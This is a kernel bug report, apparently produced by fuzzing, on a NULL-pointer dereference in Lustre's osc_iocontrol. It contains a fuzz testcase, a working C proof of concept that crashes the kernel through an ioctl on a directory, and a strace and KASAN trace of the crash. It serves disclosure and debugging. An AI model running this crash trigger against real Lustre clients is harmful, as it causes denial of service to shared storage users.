# Summary

A null-pointer dereference is detected in `osc_request.c:3358` (function `osc_iocontrol`) and then crashes the kernel.

```c
# Fuzz testcase
r0 = open(&(0x7f0000000100)='.\x00', 0x0, 0x0)
ioctl(r0, 0x40086685, 0x0)

# C PoC
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

uint64_t r[1] = {0xffffffffffffffff};
int main(void)
{
  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
  intptr_t res = 0;
  memcpy((void*)0x20000100, ".\000", 2);
  res = syscall(__NR_open, 0x20000100ul, 0ul, 0ul);
  if (res != -1)
    r[0] = res;
  syscall(__NR_ioctl, r[0], 0x40086685, 0ul);
  return 0;
}

# Strace
open(".", O_RDONLY)                     = 3
ioctl(3, _IOC(_IOC_WRITE, 0x66, 0x85, 0x8), 0) = ?
+++ killed by SIGSEGV +++
Segmentation fault
```

# Configuration

Three server nodes and one client. Kernel version: Ubuntu-5.4.0-90.101

```bash
# MGS
mkfs.lustre --fsname=lustre --mgs /dev/vda
mount -t lustre /dev/vda /root/lustre-server

# MDS
mkfs.lustre --fsname=lustre --index=0 --mgsnode=$start_ip@tcp0 --mdt /dev/vda
mount -t lustre /dev/vda /root/lustre-server

# OSS
mkfs.lustre --ost --fsname=lustre --index=1 --reformat --mgsnode=$start_ip@tcp0 /dev/vda
mount -t lustre /dev/vda /root/lustre-server

# Client
mount -t lustre $start_ip@tcp0:/lustre /root/lustre-client
```

# Trace

```bash
root@dfs-fuzzing:~# [  142.000320] kasan: CONFIG_KASAN_INLINE enabled
[  142.000869] kasan: GPF could be caused by NULL-ptr deref or user memory access
[  142.001675] general protection fault: 0000 [#1] SMP KASAN NOPTI
[  142.002347] CPU: 0 PID: 520 Comm: test Tainted: G           O      5.4.148+ #7
[  142.003143] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[  142.004159] RIP: 0010:osc_iocontrol+0x2f7/0xe80 [osc]
[  142.004719] Code: 08 5b 5d 41 5c 41 5d 41 5e 41 5f c3 e8 42 f9 b5 ce 49 8d bc 24 08 02 00 00 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 6f 0a 00 00 49 8d bf d8 05 00 00 49 8b b4 24 08
[  142.006938] RSP: 0018:ffff88824a88f6f0 EFLAGS: 00010206
[  142.007560] RAX: dffffc0000000000 RBX: ffffffffc0352780 RCX: ffffffffc0dbde1e
[  142.008362] RDX: 0000000000000041 RSI: 00000000c0086815 RDI: 0000000000000208
[  142.009128] RBP: ffff88824db93800 R08: ffff88824b3b9ec0 R09: 0000000000000000
[  142.009943] R10: ffff88824a88f940 R11: ffff88824a88fd34 R12: 0000000000000000
[  142.010754] R13: ffff88824db938e8 R14: 0000000040086685 R15: ffff88823d8336d8
[  142.011582] FS:  00007ffff7fc0540(0000) GS:ffff888257400000(0000) knlGS:0000000000000000
[  142.012552] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  142.013215] CR2: 0000000020000100 CR3: 000000024aea6005 CR4: 0000000000760ef0
[  142.014046] PKRU: 55555554
[  142.014363] Call Trace:
[  142.014656]  ? osc_import_event+0x3530/0x3530 [osc]
[  142.015213]  lov_iocontrol+0x4ba/0x5de0 [lov]
[  142.015720]  ? lov_statfs+0xf50/0xf50 [lov]
[  142.016219]  ? __sanitizer_cov_trace_switch+0x50/0x90
[  142.016839]  ? lprocfs_stats_lock+0xcf/0x220 [obdclass]
[  142.017384]  ? lprocfs_stats_unlock+0xd2/0x130 [obdclass]
[  142.017917]  ? lprocfs_counter_add+0x43a/0x600 [obdclass]
[  142.018501]  ? lprocfs_alloc_md_stats+0x400/0x400 [obdclass]
[  142.019135]  ? save_stack+0x4c/0x80
[  142.019536]  ? save_stack+0x1b/0x80
[  142.019929]  ? __kasan_kmalloc.constprop.0+0xc2/0xd0
[  142.020488]  ? lov_statfs+0xf50/0xf50 [lov]
[  142.020955]  ? ll_dir_ioctl+0x2834/0x17cc0 [lustre]
[  142.021510]  ll_dir_ioctl+0x2834/0x17cc0 [lustre]
[  142.022048]  ? class_handle2object+0x560/0x6b0 [obdclass]
[  142.022669]  ? ldlm_lock_decref_internal_nolock+0x3d0/0x3d0 [ptlrpc]
[  142.023378]  ? class_handle_hash+0x6b0/0x6b0 [obdclass]
[  142.023968]  ? ll_rmfid+0x17d0/0x17d0 [lustre]
[  142.024469]  ? __sanitizer_cov_trace_switch+0x50/0x90
[  142.025036]  ? lprocfs_stats_lock+0xcf/0x220 [obdclass]
[  142.025624]  ? lprocfs_stats_unlock+0xd2/0x130 [obdclass]
[  142.026235]  ? lprocfs_counter_add+0x43a/0x600 [obdclass]
[  142.026843]  ? lprocfs_alloc_md_stats+0x400/0x400 [obdclass]
[  142.027482]  ? lprocfs_counter_add+0x43a/0x600 [obdclass]
[  142.028096]  ? lprocfs_alloc_md_stats+0x400/0x400 [obdclass]
[  142.028738]  ? __kasan_kmalloc.constprop.0+0xc2/0xd0
[  142.029289]  ? ll_stats_ops_tally+0x241/0x380 [lustre]
[  142.029948]  ? arch_stack_walk+0x66/0xf0
[  142.030458]  ? unwind_next_frame+0x3f4/0x4a0
[  142.030983]  ? __module_text_address+0xe/0x60
[  142.031502]  ? is_ftrace_trampoline+0x5/0x10
[  142.032001]  ? kernel_text_address+0x107/0x110
[  142.032549]  ? create_prof_cpu_mask+0x20/0x20
[  142.033061]  ? __kernel_text_address+0xe/0x30
[  142.033562]  ? unwind_get_return_address+0x1b/0x30
[  142.034092]  ? create_prof_cpu_mask+0x20/0x20
[  142.034475]  ? arch_stack_walk+0xa2/0xf0
[  142.034921]  ? select_task_rq_fair+0x1c3/0x1150
[  142.035452]  ? select_task_rq_fair+0x1c3/0x1150
[  142.035990]  ? cpumask_next+0x17/0x20
[  142.036444]  ? __switch_to_asm+0x40/0x70
[  142.036910]  ? __switch_to_asm+0x34/0x70
[  142.037375]  ? __switch_to_asm+0x40/0x70
[  142.037853]  ? __switch_to_asm+0x34/0x70
[  142.038315]  ? __switch_to_asm+0x40/0x70
[  142.038769]  ? __switch_to_asm+0x34/0x70
[  142.039228]  ? __switch_to_asm+0x40/0x70
[  142.039701]  ? __switch_to_asm+0x34/0x70
[  142.040173]  ? __switch_to_asm+0x40/0x70
[  142.040642]  ? __switch_to_asm+0x34/0x70
[  142.041111]  ? __switch_to_asm+0x40/0x70
[  142.041566]  ? __switch_to_asm+0x34/0x70
[  142.042024]  ? __switch_to_asm+0x40/0x70
[  142.042475]  ? __switch_to_asm+0x34/0x70
[  142.042925]  ? __switch_to_asm+0x40/0x70
[  142.043370]  ? __switch_to_asm+0x34/0x70
[  142.043785]  ? __switch_to_asm+0x40/0x70
[  142.044248]  ? __switch_to_asm+0x34/0x70
[  142.044727]  ? __switch_to_asm+0x40/0x70
[  142.045169]  ? avc_has_extended_perms+0xe0/0x460
[  142.045667]  ? __switch_to_asm+0x40/0x70
[  142.046118]  ? __switch_to_asm+0x34/0x70
[  142.046567]  ? __switch_to_asm+0x40/0x70
[  142.046939]  ? __switch_to_asm+0x34/0x70
[  142.047248]  ? __switch_to+0x32b/0x3f0
[  142.047565]  ? __schedule+0x28c/0x5a0
[  142.047874]  ? cgroup_leave_frozen+0x4a/0xc0
[  142.048231]  ? do_vfs_ioctl+0x405/0x660
[  142.048571]  do_vfs_ioctl+0x405/0x660
[  142.049029]  ksys_ioctl+0x5e/0x90
[  142.049444]  __x64_sys_ioctl+0x16/0x20
[  142.049904]  do_syscall_64+0x48/0x140
[  142.050360]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  142.051005] RIP: 0033:0x7ffff7ee870d
[  142.051448] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 53 f7 0c 00 f7 d8 64 89 01 48
[  142.053593] RSP: 002b:00007fffffffe348 EFLAGS: 00000213 ORIG_RAX: 0000000000000010
[  142.054686] RAX: ffffffffffffffda RBX: 0000555555555290 RCX: 00007ffff7ee870d
[  142.055484] RDX: 0000000000000000 RSI: 0000000040086685 RDI: 0000000000000003
[  142.056285] RBP: 00007fffffffe360 R08: 00007fffffffe450 R09: 00007fffffffe450
[  142.057102] R10: 0000000000000000 R11: 0000000000000213 R12: 0000555555555080
[  142.057909] R13: 00007fffffffe450 R14: 0000000000000000 R15: 0000000000000000
[  142.058715] Modules linked in: mgc(O) lustre(O) lmv(O) mdc(O) fid(O) lov(O) fld(O) osc(O) ksocklnd(O) ptlrpc(O) obdclass(O) lnet(O) libcfs(O)
[  142.060313] ---[ end trace 9c88039dbe2366d5 ]---
[  142.060919] RIP: 0010:osc_iocontrol+0x2f7/0xe80 [osc]
[  142.061569] Code: 08 5b 5d 41 5c 41 5d 41 5e 41 5f c3 e8 42 f9 b5 ce 49 8d bc 24 08 02 00 00 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 6f 0a 00 00 49 8d bf d8 05 00 00 49 8b b4 24 08
[  142.064004] RSP: 0018:ffff88824a88f6f0 EFLAGS: 00010206
[  142.064817] RAX: dffffc0000000000 RBX: ffffffffc0352780 RCX: ffffffffc0dbde1e
[  142.065573] RDX: 0000000000000041 RSI: 00000000c0086815 RDI: 0000000000000208
[  142.066227] RBP: ffff88824db93800 R08: ffff88824b3b9ec0 R09: 0000000000000000
[  142.066887] R10: ffff88824a88f940 R11: ffff88824a88fd34 R12: 0000000000000000
[  142.067513] R13: ffff88824db938e8 R14: 0000000040086685 R15: ffff88823d8336d8
[  142.068139] FS:  00007ffff7fc0540(0000) GS:ffff888257400000(0000) knlGS:0000000000000000
[  142.068921] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  142.069568] CR2: 0000000020000100 CR3: 000000024aea6005 CR4: 0000000000760ef0
[  142.070358] PKRU: 55555554
```

# Bug Location

```c
static int osc_iocontrol(unsigned int cmd, struct obd_export *exp, int len,
                         void *karg, void __user *uarg)
{

	...

        default:
                rc = -ENOTTY;
				//Bug in this line.
    			CDEBUG(D_INODE, "%s: unrecognised ioctl %#x by %s: rc = %d\n",
                       obd->obd_name, cmd, current->comm, rc);
                break;
        }

        module_put(THIS_MODULE);
        return rc;
}
```

